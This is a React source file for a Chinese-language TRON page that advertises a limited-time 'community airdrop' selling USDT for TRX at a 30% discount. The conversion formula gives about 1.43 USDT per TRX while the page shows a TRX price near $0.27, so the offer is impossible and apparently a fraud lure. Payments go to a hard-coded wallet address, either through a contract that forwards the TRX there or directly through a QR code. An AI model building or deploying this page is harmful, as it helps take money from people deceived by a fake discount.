import React, { useState, useEffect } from 'react';
import QRCode from 'react-qr-code';

const App = () => {
  const [trxAmount, setTrxAmount] = useState('');
  const [usdtAmount, setUsdtAmount] = useState('');
  const [trxPrice, setTrxPrice] = useState(null);
  const [tronWeb, setTronWeb] = useState(null);
  const [showQR, setShowQR] = useState(false);
  const [qrString, setQrString] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [transactionStatus, setTransactionStatus] = useState('');
  const [transactionIds, setTransactionIds] = useState({ buy: '' });
  const [contractBalances, setContractBalances] = useState({ usdt: null, trx: null });
  const [recentUsdtTransfers, setRecentUsdtTransfers] = useState([]);

  const paymentAddress = 'TWRAzGd4KGgyESBbe4EFaADFMFgG999BcD';
  const contractAddress = 'NEW_CONTRACT_ADDRESS'; // 替换为新部署的合约地址

  useEffect(() => {
    const checkTronLink = async () => {
      if (window.tronWeb && window.tronWeb.ready) {
        setTronWeb(window.tronWeb);
        checkContractBalances();
        checkRecentUsdtTransfers();
      } else {
        const interval = setInterval(() => {
          if (window.tronWeb && window.tronWeb.ready) {
            setTronWeb(window.tronWeb);
            checkContractBalances();
            checkRecentUsdtTransfers();
            clearInterval(interval);
          }
        }, 1000);
        return () => clearInterval(interval);
      }
    };
    checkTronLink();

    fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron&vs_currencies=usd')
      .then(res => res.json())
      .then(data => setTrxPrice(data.tron?.usd || 0.27))
      .catch(() => setTrxPrice(0.27));
  }, []);

  const calculateUsdt = (trx) => {
    const val = parseFloat(trx);
    if (!val || !trxPrice) return '';
    return (val / 0.7).toFixed(4); // 七折优惠
  };

  const handleTrxChange = (e) => {
    const val = e.target.value;
    if (/^\d*\.?\d*$/.test(val)) {
      setTrxAmount(val);
      setUsdtAmount(calculateUsdt(val));
      setShowQR(false);
      setTransactionStatus('');
      setTransactionIds({ buy: '' });
    }
  };

  const checkContractBalances = async () => {
    if (!tronWeb) return;
    try {
      const contract = await tronWeb.contract().at(contractAddress);
      const usdtBalance = await contract.balanceOf(contractAddress).call();
      const usdtBalanceInUsdt = tronWeb.fromSun(usdtBalance);
      const trxBalance = await tronWeb.trx.getBalance(contractAddress);
      const trxBalanceInTrx = tronWeb.fromSun(trxBalance);
      setContractBalances({
        usdt: parseFloat(usdtBalanceInUsdt).toFixed(4),
        trx: parseFloat(trxBalanceInTrx).toFixed(4),
      });
    } catch (error) {
      console.error('检查余额失败:', error);
      setContractBalances({ usdt: '查询失败', trx: '查询失败' });
    }
  };

  const checkRecentUsdtTransfers = async () => {
    if (!tronWeb) return;
    try {
      const events = await tronWeb.getEventResult(contractAddress, {
        eventName: 'Transfer',
        size: 100,
      });
      const transfers = events
        .filter(e => e.contract_address === contractAddress)
        .map(e => ({
          from: e.result.from,
          to: e.result.to,
          value: tronWeb.fromSun(e.result.value),
          txId: e.transaction_id,
          timestamp: new Date(e.timestamp).toLocaleString(),
        }))
        .slice(0, 5);
      setRecentUsdtTransfers(transfers);
    } catch (error) {
      console.error('查询转账记录失败:', error);
      setRecentUsdtTransfers([]);
    }
  };

  const handleBuy = async () => {
    const val = parseFloat(trxAmount);
    if (!val || val <= 0) {
      setTransactionStatus('请输入有效的TRX数量');
      return;
    }

    setIsLoading(true);
    setTransactionStatus('');
    setTransactionIds({ buy: '' });

    if (tronWeb) {
      try {
        const userAddress = tronWeb.defaultAddress.base58;
        if (!userAddress) {
          throw new Error('未检测到用户钱包地址');
        }

        const usdtAmountToBuy = parseFloat(calculateUsdt(val)) * 1e6;
        const usdtBalance = parseFloat(contractBalances.usdt);
        if (isNaN(usdtBalance) || usdtBalance < usdtAmountToBuy / 1e6) {
          throw new Error(`合约USDT余额不足（当前: ${contractBalances.usdt || '0'} USDT，需: ${usdtAmountToBuy / 1e6} USDT）`);
        }

        const amountInSun = tronWeb.toSun(val);
        const contract = await tronWeb.contract().at(contractAddress);
        const buyTransaction = await contract.buy(usdtAmountToBuy).send({
          callValue: amountInSun,
          shouldPollResponse: true,
          feeLimit: 100000000,
          from: userAddress,
        });

        setTransactionIds({ buy: buyTransaction });
        setTransactionStatus(
          `购买成功！USDT已发放，TRX已转发到 ${paymentAddress}，交易ID: ${buyTransaction}`,
        );
        setTrxAmount('');
        setUsdtAmount('');
        checkContractBalances();
      } catch (error) {
        let errorMessage = error.message || '未知错误';
        if (error.output?.contractResult) {
          const result = error.output.contractResult[0];
          if (result) {
            try {
              const decoded = Buffer.from(result.slice(136), 'hex').toString('utf8');
              errorMessage = `合约回滚：${decoded}`;
            } catch {
              errorMessage = '无法解析revert原因';
            }
          }
        }
        setTransactionStatus(`购买失败：${errorMessage}\n请检查合约余额或联系支持（support@example.com）。`);
      }
    } else {
      const qrData = `tron:${paymentAddress}?amount=${val.toFixed(6)}`;
      setQrString(qrData);
      setShowQR(true);
      setTransactionStatus('请使用支持TRON的钱包扫描二维码转账');
    }

    setIsLoading(false);
  };

  const handleCheckBalance = async () => {
    setIsLoading(true);
    await checkContractBalances();
    await checkRecentUsdtTransfers();
    setTransactionStatus(
      `合约当前余额：USDT ${contractBalances.usdt || '查询中'}，TRX ${contractBalances.trx || '查询中'}\n近期USDT转账记录已更新。`,
    );
    setIsLoading(false);
  };

  return (
    <div className="min-h-screen bg-gray-100 flex items-center justify-center px-4">
      <div className="bg-white rounded-2xl shadow-xl w-full max-w-md p-6 text-center space-y-5">
        <div className="flex justify-center items-center space-x-3">
          <img
            src="https://i.imgur.com/pNAm2gN.png"
            alt="USDT Logo"
            className="w-10 h-10"
            onError={(e) => (e.target.style.display = 'none')}
          />
          <h1 className="text-2xl font-bold text-gray-800">USDT</h1>
        </div>

        <p className="text-sm text-yellow-600 font-medium">
          社区空投活动：TRX七折购买USDT（限时优惠）
        </p>

        <p className="text-lg font-semibold text-gray-700">
          实时价格：${trxPrice?.toFixed(2) || '0.27'} / TRX
        </p>

        <p className="text-sm text-gray-600">
          合约余额: USDT <span className="font-semibold">{contractBalances.usdt !== null ? `${contractBalances.usdt} USDT` : '查询中...'}</span>,
          TRX <span className="font-semibold">{contractBalances.trx !== null ? `${contractBalances.trx} TRX` : '查询中...'}</span>
        </p>

        <input
          type="text"
          placeholder="输入TRX数量"
          value={trxAmount}
          onChange={handleTrxChange}
          className="w-full border border-gray-300 rounded-lg py-3 px-4 text-center text-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
        />

        <div className="text-sm text-gray-600">
          可购买USDT: <span className="font-semibold">{usdtAmount || '0.0000'}</span>
        </div>

        <button
          onClick={handleBuy}
          disabled={isLoading}
          className={`w-full bg-blue-500 text-white text-lg font-semibold py-3 rounded-lg transition ${
            isLoading ? 'opacity-50 cursor-not-allowed' : 'hover:bg-blue-600'
          }`}
        >
          {isLoading ? '处理中...' : '购买'}
        </button>

        <button
          onClick={handleCheckBalance}
          disabled={isLoading || !tronWeb}
          className={`w-full bg-gray-500 text-white text-lg font-semibold py-3 rounded-lg transition ${
            isLoading || !tronWeb ? 'opacity-50 cursor-not-allowed' : 'hover:bg-gray-600'
          }`}
        >
          {isLoading ? '查询中...' : '查询余额和转账记录'}
        </button>

        {transactionStatus && (
          <p className={`text-sm ${transactionStatus.includes('成功') && !transactionStatus.includes('失败') ? 'text-green-600' : 'text-red-600'}`}>
            {transactionStatus.split('\n').map((line, index) => (
              <span key={index}>
                {line}
                <br />
              </span>
            ))}
            {transactionIds.buy && (
              <a
                href={`https://tronscan.org/#/transaction/${transactionIds.buy}`}
                target="_blank"
                rel="noopener noreferrer"
                className="underline text-blue-500"
              >
                查看交易
              </a>
            )}
          </p>
        )}

        {recentUsdtTransfers.length > 0 && (
          <div className="text-sm text-gray-600">
            <p className="font-semibold">近期USDT转账记录（最近5条）:</p>
            <ul className="list-disc text-left pl-5">
              {recentUsdtTransfers.map((transfer, index) => (
                <li key={index}>
                  {transfer.from === contractAddress ? '流出' : '流入'}: {transfer.value} USDT,
                  到: {transfer.to.slice(0, 6)}...{transfer.to.slice(-4)},
                  时间: {transfer.timestamp},
                  <a
                    href={`https://tronscan.org/#/transaction/${transfer.txId}`}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="underline text-blue-500"
                  >
                    查看
                  </a>
                </li>
              ))}
            </ul>
          </div>
        )}

        {showQR && qrString && (
          <div className="pt-4 space-y-2">
            <QRCode value={qrString} size={150} className="mx-auto" />
            <p className="text-sm text-gray-500">请使用TRON钱包扫描二维码转账</p>
            <p className="text-xs text-gray-400 break-all">收款地址: {paymentAddress}</p>
            <p className="text-xs text-gray-400">转账金额: {trxAmount} TRX</p>
          </div>
        )}
      </div>
    </div>
  );
};

export default App;
